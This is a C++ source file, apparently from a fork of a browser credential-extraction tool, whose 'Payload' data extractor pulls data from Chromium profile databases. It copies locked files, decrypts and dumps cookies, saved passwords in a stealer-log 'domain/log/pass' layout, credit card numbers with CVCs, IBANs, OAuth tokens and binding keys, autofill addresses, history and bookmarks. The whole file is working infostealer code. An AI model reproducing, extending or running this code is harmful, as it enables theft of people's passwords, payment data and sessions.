// ...existing code...
// ...existing code...

// ...existing code...
// (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#include "data_extractor.hpp"
#include "handle_duplicator.hpp"
#include "../crypto/aes_gcm.hpp"
#include <fstream>
#include <sstream>
#include <iomanip>
#include <map>
#include <algorithm>

namespace Payload {

    DataExtractor::DataExtractor(PipeClient& pipe, const std::vector<uint8_t>& key, const std::filesystem::path& outputBase)
        : m_pipe(pipe), m_key(key), m_outputBase(outputBase) {}

    sqlite3* DataExtractor::OpenDatabase(const std::filesystem::path& dbPath) {
        sqlite3* db = nullptr;
        std::string uri = "file:" + dbPath.string() + "?nolock=1";
        if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, nullptr) != SQLITE_OK) {
            if (db) sqlite3_close(db);
            return nullptr;
        }
        return db;
    }

    sqlite3* DataExtractor::OpenDatabaseWithHandleDuplication(const std::filesystem::path& dbPath) {
        sqlite3* db = OpenDatabase(dbPath);
        if (db) {
            sqlite3_stmt* stmt = nullptr;
            if (sqlite3_prepare_v2(db, "SELECT 1", -1, &stmt, nullptr) == SQLITE_OK) {
                if (sqlite3_step(stmt) == SQLITE_ROW) {
                    sqlite3_finalize(stmt);
                    return db;
                }
                sqlite3_finalize(stmt);
            }
            sqlite3_close(db);
            db = nullptr;
        }

        HandleDuplicator duplicator;

        auto tempDir = m_outputBase / ".temp";
        auto tempDbPath = duplicator.CopyLockedFile(dbPath, tempDir);

        if (!tempDbPath) {
            return nullptr;
        }

        m_tempFiles.push_back(*tempDbPath);

        return OpenDatabase(*tempDbPath);
    }

    void DataExtractor::CleanupTempFiles() {
        for (const auto& tempFile : m_tempFiles) {
            try {
                if (std::filesystem::exists(tempFile)) {
                    std::filesystem::remove(tempFile);
                }
            } catch (...) {
                // Ignore cleanup failures
            }
        }
        m_tempFiles.clear();

        try {
            auto tempDir = m_outputBase / ".temp";
            if (std::filesystem::exists(tempDir) && std::filesystem::is_empty(tempDir)) {
                std::filesystem::remove(tempDir);
            }
        } catch (...) {}
    }

    void DataExtractor::ProcessProfile(const std::filesystem::path& profilePath, const std::string& browserName) {
        auto profileOutDir = m_outputBase / browserName / profilePath.filename();
        std::filesystem::create_directories(profileOutDir);

        // WebRTC settings (Preferences file)
        auto prefsPath = profilePath / "Preferences";
        if (std::filesystem::exists(prefsPath)) {
            ExtractWebRTC(prefsPath, profileOutDir / "webrtc.txt");
        }

        m_pipe.Log("PROFILE:" + profilePath.filename().string());

        // Cookies
        auto cookiePath = profilePath / "Network" / "Cookies";
        if (std::filesystem::exists(cookiePath)) {
            if (auto db = OpenDatabaseWithHandleDuplication(cookiePath)) {
                ExtractCookies(db, profileOutDir / "cookies.txt");
                sqlite3_close(db);
            }
        }

        // Passwords (local)
        auto loginPath = profilePath / "Login Data";
        if (std::filesystem::exists(loginPath)) {
            if (auto db = OpenDatabaseWithHandleDuplication(loginPath)) {
                ExtractPasswords(db, profileOutDir / "passwords.txt");
                sqlite3_close(db);
            }
        }

        // Passwords (account-synced)
        auto loginAccountPath = profilePath / "Login Data For Account";
        if (std::filesystem::exists(loginAccountPath)) {
            if (auto db = OpenDatabaseWithHandleDuplication(loginAccountPath)) {
                ExtractPasswords(db, profileOutDir / "passwords_account.txt");
                sqlite3_close(db);
            }
        }

        // Cards, IBANs, Tokens, Autofill (Web Data)
        auto webDataPath = profilePath / "Web Data";
        if (std::filesystem::exists(webDataPath)) {
            if (auto db = OpenDatabaseWithHandleDuplication(webDataPath)) {
                ExtractCards(db, profileOutDir / "cards.txt");
                ExtractIBANs(db, profileOutDir / "iban.txt");
                ExtractTokens(db, profileOutDir / "tokens.txt");
                ExtractAutofill(db, profileOutDir / "autofill.txt");
                sqlite3_close(db);
            }
        }

        // Bookmarks (JSON file)
        auto bookmarksPath = profilePath / "Bookmarks";
        if (std::filesystem::exists(bookmarksPath)) {
            ExtractBookmarks(bookmarksPath, profileOutDir / "bookmarks.txt");
        }

        // History
        auto historyPath = profilePath / "History";
        if (std::filesystem::exists(historyPath)) {
            if (auto db = OpenDatabaseWithHandleDuplication(historyPath)) {
                ExtractHistory(db, profileOutDir / "history.txt");
                sqlite3_close(db);
            }
        }

        CleanupTempFiles();
    }

    void DataExtractor::ExtractAutofill(sqlite3* db, const std::filesystem::path& outFile) {
        sqlite3_stmt* stmt;
        // Chrome autofill_profiles table: full_name, company_name, address_line_1, address_line_2, city, state, zip_code, country_code, phone_number, email
        const char* query = "SELECT full_name, company_name, address_line_1, address_line_2, city, state, zip_code, country_code, phone_number, email FROM autofill_profiles";
        if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) != SQLITE_OK) return;

        std::vector<std::string> entries;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            std::stringstream ss;
            ss << "{\n"
               << "  \"full_name\": \"" << EscapeJson((char*)sqlite3_column_text(stmt, 0)) << "\",\n"
               << "  \"company_name\": \"" << EscapeJson((char*)sqlite3_column_text(stmt, 1)) << "\",\n"
               << "  \"address_line_1\": \"" << EscapeJson((char*)sqlite3_column_text(stmt, 2)) << "\",\n"
               << "  \"address_line_2\": \"" << EscapeJson((char*)sqlite3_column_text(stmt, 3)) << "\",\n"
               << "  \"city\": \"" << EscapeJson((char*)sqlite3_column_text(stmt, 4)) << "\",\n"
               << "  \"state\": \"" << EscapeJson((char*)sqlite3_column_text(stmt, 5)) << "\",\n"
               << "  \"zip_code\": \"" << EscapeJson((char*)sqlite3_column_text(stmt, 6)) << "\",\n"
               << "  \"country_code\": \"" << EscapeJson((char*)sqlite3_column_text(stmt, 7)) << "\",\n"
               << "  \"phone_number\": \"" << EscapeJson((char*)sqlite3_column_text(stmt, 8)) << "\",\n"
               << "  \"email\": \"" << EscapeJson((char*)sqlite3_column_text(stmt, 9)) << "\"\n"
               << "}";
            entries.push_back(ss.str());
        }
        sqlite3_finalize(stmt);

        if (!entries.empty()) {
            std::filesystem::create_directories(outFile.parent_path());
            std::ofstream out(outFile);
            out << "[\n";
            for (size_t i = 0; i < entries.size(); ++i) {
                out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
            }
            out << "]";
            m_pipe.Log("AUTOFILL:" + std::to_string(entries.size()));
        }
    }

    void DataExtractor::ExtractCookies(sqlite3* db, const std::filesystem::path& outFile) {
        sqlite3_stmt* stmt;
        const char* query = "SELECT host_key, name, path, is_secure, is_httponly, expires_utc, encrypted_value, samesite FROM cookies";
        if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) != SQLITE_OK) return;

        std::vector<std::string> entries;
        int total = 0;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            total++;
            const void* blob = sqlite3_column_blob(stmt, 6);
            int blobLen = sqlite3_column_bytes(stmt, 6);
            if (blob && blobLen > 0) {
                std::vector<uint8_t> encrypted((uint8_t*)blob, (uint8_t*)blob + blobLen);
                auto decrypted = Crypto::AesGcm::Decrypt(m_key, encrypted);
                if (decrypted && !decrypted->empty()) {
                    std::string val;
                    if (decrypted->size() > 32) {
                        val = std::string((char*)decrypted->data() + 32, decrypted->size() - 32);
                    } else {
                        val = std::string((char*)decrypted->data(), decrypted->size());
                    }
                    std::string domain = (char*)sqlite3_column_text(stmt, 0);
                    std::string name = (char*)sqlite3_column_text(stmt, 1);
                    std::string path = (char*)sqlite3_column_text(stmt, 2);
                    bool secure = sqlite3_column_int(stmt, 3) != 0;
                    bool httpOnly = sqlite3_column_int(stmt, 4) != 0;
                    std::string sameSite = (char*)sqlite3_column_text(stmt, 7);
                    std::stringstream ss;
                    ss << "{\n"
                       << "  \"domain\": \"" << EscapeJson(domain) << "\",\n"
                       << "  \"name\": \"" << EscapeJson(name) << "\",\n"
                       << "  \"value\": \"" << EscapeJson(val) << "\",\n"
                       << "  \"path\": \"" << EscapeJson(path) << "\",\n"
                       << "  \"secure\": " << (secure ? "true" : "false") << ",\n"
                       << "  \"httpOnly\": " << (httpOnly ? "true" : "false") << ",\n"
                       << "  \"sameSite\": \"" << EscapeJson(sameSite) << "\"\n"
                       << "}";
                    entries.push_back(ss.str());
                }
            }
        }
        sqlite3_finalize(stmt);

        if (!entries.empty()) {
            std::filesystem::create_directories(outFile.parent_path());
            std::ofstream out(outFile);
            out << "[\n";
            for (size_t i = 0; i < entries.size(); ++i) {
                out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
            }
            out << "]";
            m_pipe.Log("COOKIES:" + std::to_string(entries.size()) + ":" + std::to_string(total));
        }
    }

    void DataExtractor::ExtractPasswords(sqlite3* db, const std::filesystem::path& outFile) {
        sqlite3_stmt* stmt;
        const char* query = "SELECT origin_url, username_value, password_value FROM logins";
        if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) != SQLITE_OK) return;

        std::vector<std::string> entries;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const void* blob = sqlite3_column_blob(stmt, 2);
            int blobLen = sqlite3_column_bytes(stmt, 2);
            if (blob && blobLen > 0) {
                std::vector<uint8_t> encrypted((uint8_t*)blob, (uint8_t*)blob + blobLen);
                auto decrypted = Crypto::AesGcm::Decrypt(m_key, encrypted);
                if (decrypted) {
                    std::string val((char*)decrypted->data(), decrypted->size());
                    std::string url = (const char*)sqlite3_column_text(stmt, 0);
                    std::string user = (const char*)sqlite3_column_text(stmt, 1);
                    // --- Извлечь только домен из url ---
                    std::string domain = url;
                    // Удалить протокол
                    size_t proto = domain.find("//");
                    if (proto != std::string::npos) domain = domain.substr(proto + 2);
                    // Обрезать путь
                    size_t slash = domain.find('/');
                    if (slash != std::string::npos) domain = domain.substr(0, slash);
                    // Обрезать @ (android://...@package/)
                    size_t at = domain.find('@');
                    if (at != std::string::npos) domain = domain.substr(at + 1);
                    // Обрезать :port
                    size_t colon = domain.find(':');
                    if (colon != std::string::npos) domain = domain.substr(0, colon);
                    std::stringstream ss;
                    ss << "domain " << domain << "\n" << "log " << user << "\n" << "pass " << val << "\n\n";
                    entries.push_back(ss.str());
                }
            }
        }
        sqlite3_finalize(stmt);

        if (!entries.empty()) {
            std::filesystem::create_directories(outFile.parent_path());
            std::ofstream out(outFile);
            for (const auto& e : entries) out << e;
            m_pipe.Log("PASSWORDS:" + std::to_string(entries.size()));
        }
    }

    void DataExtractor::ExtractCards(sqlite3* db, const std::filesystem::path& outFile) {
        // 1. Load CVCs
        std::map<std::string, std::string> cvcMap;
        sqlite3_stmt* stmt;
        if (sqlite3_prepare_v2(db, "SELECT guid, value_encrypted FROM local_stored_cvc", -1, &stmt, nullptr) == SQLITE_OK) {
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                const char* guid = (const char*)sqlite3_column_text(stmt, 0);
                const void* blob = sqlite3_column_blob(stmt, 1);
                int len = sqlite3_column_bytes(stmt, 1);
                if (guid && blob && len > 0) {
                    std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + len);
                    auto dec = Crypto::AesGcm::Decrypt(m_key, enc);
                    if (dec) cvcMap[guid] = std::string((char*)dec->data(), dec->size());
                }
            }
            sqlite3_finalize(stmt);
        }

        // 2. Extract Cards
        if (sqlite3_prepare_v2(db, "SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards", -1, &stmt, nullptr) != SQLITE_OK) return;

        std::vector<std::string> entries;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const char* guid = (const char*)sqlite3_column_text(stmt, 0);
            const void* blob = sqlite3_column_blob(stmt, 4);
            int len = sqlite3_column_bytes(stmt, 4);
            
            if (blob && len > 0) {
                std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + len);
                auto dec = Crypto::AesGcm::Decrypt(m_key, enc);
                if (dec) {
                    std::string num((char*)dec->data(), dec->size());
                    std::string cvc = (guid && cvcMap.count(guid)) ? cvcMap[guid] : "";
                    
                    std::stringstream ss;
                    ss << "{\"name\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 1)) << "\","
                       << "\"month\":" << sqlite3_column_int(stmt, 2) << ","
                       << "\"year\":" << sqlite3_column_int(stmt, 3) << ","
                       << "\"number\":\"" << EscapeJson(num) << "\","
                       << "\"cvc\":\"" << EscapeJson(cvc) << "\"}";
                    entries.push_back(ss.str());
                }
            }
        }
        sqlite3_finalize(stmt);

        if (!entries.empty()) {
            std::filesystem::create_directories(outFile.parent_path());
            std::ofstream out(outFile);
            out << "[\n";
            for (size_t i = 0; i < entries.size(); ++i) out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
            out << "]";
            m_pipe.Log("CARDS:" + std::to_string(entries.size()));
        }
    }

    void DataExtractor::ExtractIBANs(sqlite3* db, const std::filesystem::path& outFile) {
        sqlite3_stmt* stmt;
        if (sqlite3_prepare_v2(db, "SELECT value_encrypted, nickname FROM local_ibans", -1, &stmt, nullptr) != SQLITE_OK) return;

        std::vector<std::string> entries;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const void* blob = sqlite3_column_blob(stmt, 0);
            int len = sqlite3_column_bytes(stmt, 0);
            
            if (blob && len > 0) {
                std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + len);
                auto dec = Crypto::AesGcm::Decrypt(m_key, enc);
                if (dec) {
                    std::string val((char*)dec->data(), dec->size());
                    std::stringstream ss;
                    ss << "{\"nickname\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 1)) << "\","
                       << "\"iban\":\"" << EscapeJson(val) << "\"}";
                    entries.push_back(ss.str());
                }
            }
        }
        sqlite3_finalize(stmt);

        if (!entries.empty()) {
            std::filesystem::create_directories(outFile.parent_path());
            std::ofstream out(outFile);
            out << "[\n";
            for (size_t i = 0; i < entries.size(); ++i) out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
            out << "]";
            m_pipe.Log("IBANS:" + std::to_string(entries.size()));
        }
    }

    void DataExtractor::ExtractTokens(sqlite3* db, const std::filesystem::path& outFile) {
        sqlite3_stmt* stmt;
        bool hasBindingKey = true;
        
        if (sqlite3_prepare_v2(db, "SELECT service, encrypted_token, binding_key FROM token_service", -1, &stmt, nullptr) != SQLITE_OK) {
            hasBindingKey = false;
            if (sqlite3_prepare_v2(db, "SELECT service, encrypted_token FROM token_service", -1, &stmt, nullptr) != SQLITE_OK) return;
        }

        std::vector<std::string> entries;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const void* blob = sqlite3_column_blob(stmt, 1);
            int len = sqlite3_column_bytes(stmt, 1);
            
            if (blob && len > 0) {
                std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + len);
                auto dec = Crypto::AesGcm::Decrypt(m_key, enc);
                if (dec) {
                    std::string val((char*)dec->data(), dec->size());
                    std::string bindingKey = "";
                    
                    if (hasBindingKey) {
                        const void* bKeyBlob = sqlite3_column_blob(stmt, 2);
                        int bKeyLen = sqlite3_column_bytes(stmt, 2);
                        if (bKeyBlob && bKeyLen > 0) {
                            std::vector<uint8_t> encKey((uint8_t*)bKeyBlob, (uint8_t*)bKeyBlob + bKeyLen);
                            auto decKey = Crypto::AesGcm::Decrypt(m_key, encKey);
                            if (decKey) {
                                bindingKey = std::string((char*)decKey->data(), decKey->size());
                            }
                        }
                    }

                    std::stringstream ss;
                    ss << "{\"service\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 0)) << "\","
                       << "\"token\":\"" << EscapeJson(val) << "\","
                       << "\"binding_key\":\"" << EscapeJson(bindingKey) << "\"}";
                    entries.push_back(ss.str());
                }
            }
        }
        sqlite3_finalize(stmt);

        if (!entries.empty()) {
            std::filesystem::create_directories(outFile.parent_path());
            std::ofstream out(outFile);
            out << "[\n";
            for (size_t i = 0; i < entries.size(); ++i) out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
            out << "]";
            m_pipe.Log("TOKENS:" + std::to_string(entries.size()));
        }
    }

    std::string DataExtractor::FormatWebKitTimestamp(int64_t webkitTimestamp) {
        if (webkitTimestamp <= 0) return "Never";

        FILETIME ft;
        GetSystemTimeAsFileTime(&ft);
        ULARGE_INTEGER uli;
        uli.LowPart = ft.dwLowDateTime;
        uli.HighPart = ft.dwHighDateTime;
        
        int64_t currentMicroseconds = uli.QuadPart / 10;
        int64_t diff = currentMicroseconds - webkitTimestamp;
        
        if (diff < 0) return "Just now";
        
        int64_t seconds = diff / 1000000;
        int64_t minutes = seconds / 60;
        int64_t hours = minutes / 60;
        int64_t days = hours / 24;
        
        seconds %= 60;
        minutes %= 60;
        hours %= 24;
        
        std::stringstream ss;
        if (days > 0) ss << days << " day" << (days > 1 ? "s " : " ");
        if (hours > 0) ss << hours << " hour" << (hours > 1 ? "s " : " ");
        if (minutes > 0) ss << minutes << " minute" << (minutes > 1 ? "s " : " ");
        if (seconds > 0 || ss.str().empty()) ss << seconds << " sec";
        
        ss << " ago";
        return ss.str();
    }

    std::string DataExtractor::EscapeJson(const std::string& s) {
        std::ostringstream o;
        for (char c : s) {
            if (c == '"') o << "\\\"";
            else if (c == '\\') o << "\\\\";
            else if (c == '\b') o << "\\b";
            else if (c == '\f') o << "\\f";
            else if (c == '\n') o << "\\n";
            else if (c == '\r') o << "\\r";
            else if (c == '\t') o << "\\t";
            else if ('\x00' <= c && c <= '\x1f') o << "\\u" << std::hex << std::setw(4) << std::setfill('0') << (int)c;
            else o << c;
        }
        return o.str();
    }

    void DataExtractor::ExtractHistory(sqlite3* db, const std::filesystem::path& outFile) {
        sqlite3_stmt* stmt;
        const char* query = "SELECT url, title, visit_count, last_visit_time FROM urls";
        if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) != SQLITE_OK) return;
        std::vector<std::string> entries;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            int64_t last_visit_time = sqlite3_column_int64(stmt, 3);
            std::stringstream ss;
            ss << "{\n"
               << "  \"url\": \"" << EscapeJson((char*)sqlite3_column_text(stmt, 0)) << "\",\n"
               << "  \"title\": \"" << EscapeJson((char*)sqlite3_column_text(stmt, 1)) << "\",\n"
               << "  \"visit_count\": " << sqlite3_column_int(stmt, 2) << ",\n"
               << "  \"last_visit_time\": " << last_visit_time << ",\n"
               << "  \"formatted_last_visit_time\": \"" << FormatWebKitTimestamp(last_visit_time) << "\"\n"
               << "}";
            entries.push_back(ss.str());
        }
        sqlite3_finalize(stmt);
        if (!entries.empty()) {
            std::filesystem::create_directories(outFile.parent_path());
            std::ofstream out(outFile);
            out << "[\n";
            for (size_t i = 0; i < entries.size(); ++i) {
                out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
            }
            out << "]";
            m_pipe.Log("HISTORY:" + std::to_string(entries.size()));
        }
    }

    void DataExtractor::ExtractWebRTC(const std::filesystem::path& prefsPath, const std::filesystem::path& outFile) {
        std::ifstream f(prefsPath);
        if (!f) return;
        std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
        std::string ipPolicy = "unknown", allowedUrls = "unknown";
        size_t ipPos = content.find("webrtc_ip_handling_policy");
        if (ipPos != std::string::npos) {
            size_t valStart = content.find(':', ipPos);
            if (valStart != std::string::npos) {
                size_t quoteStart = content.find('"', valStart + 1);
                size_t quoteEnd = content.find('"', quoteStart + 1);
                if (quoteStart != std::string::npos && quoteEnd != std::string::npos)
                    ipPolicy = content.substr(quoteStart + 1, quoteEnd - quoteStart - 1);
            }
        }
        size_t urlsPos = content.find("webrtc_local_ips_allowed_urls");
        if (urlsPos != std::string::npos) {
            size_t valStart = content.find('[', urlsPos);
            size_t valEnd = content.find(']', valStart);
            if (valStart != std::string::npos && valEnd != std::string::npos)
                allowedUrls = content.substr(valStart, valEnd - valStart + 1);
        }
        std::filesystem::create_directories(outFile.parent_path());
        std::ofstream out(outFile);
        out << "WebRTC Settings:\n";
        out << "IP Handling Policy: " << ipPolicy << "\n";
        out << "Local IPs Allowed URLs: " << allowedUrls << "\n";
        m_pipe.Log("WEBRTC:" + ipPolicy);
    }
void Payload::DataExtractor::ExtractBookmarks(const std::filesystem::path& bookmarksPath, const std::filesystem::path& outFile) {
    // Minimal parser: extract lines with "name" and "url" pairs
    std::ifstream in(bookmarksPath);
    std::vector<std::pair<std::string, std::string>> bookmarks;
    std::string line, name, url;
    bool inBookmark = false;
    auto trim = [](std::string s) {
        size_t start = s.find_first_not_of(" \t\r\n");
        size_t end = s.find_last_not_of(" \t\r\n");
        return (start == std::string::npos) ? "" : s.substr(start, end - start + 1);
    };
    while (std::getline(in, line)) {
        line = trim(line);
        if (line.find("\"type\": \"url\"") != std::string::npos) inBookmark = true;
        if (inBookmark && line.find("\"name\":") != std::string::npos) {
            size_t pos = line.find(':');
            if (pos != std::string::npos) {
                name = line.substr(pos + 1);
                name.erase(std::remove(name.begin(), name.end(), '"'), name.end());
                name.erase(std::remove(name.begin(), name.end(), ','), name.end());
                name = trim(name);
            }
        }
        if (inBookmark && line.find("\"url\":") != std::string::npos) {
            size_t pos = line.find(':');
            if (pos != std::string::npos) {
                url = line.substr(pos + 1);
                url.erase(std::remove(url.begin(), url.end(), '"'), url.end());
                url.erase(std::remove(url.begin(), url.end(), ','), url.end());
                url = trim(url);
                bookmarks.emplace_back(name, url);
                inBookmark = false;
            }
        }
    }
    if (!bookmarks.empty()) {
        std::filesystem::create_directories(outFile.parent_path());
        std::ofstream out(outFile);
        out << "Bookmarks:\n";
        for (const auto& bm : bookmarks) {
            out << "Name: " << bm.first << "\nURL: " << bm.second << "\n\n";
        }
        m_pipe.Log("BOOKMARKS:" + std::to_string(bookmarks.size()));
        }
    }
} // namespace Payload
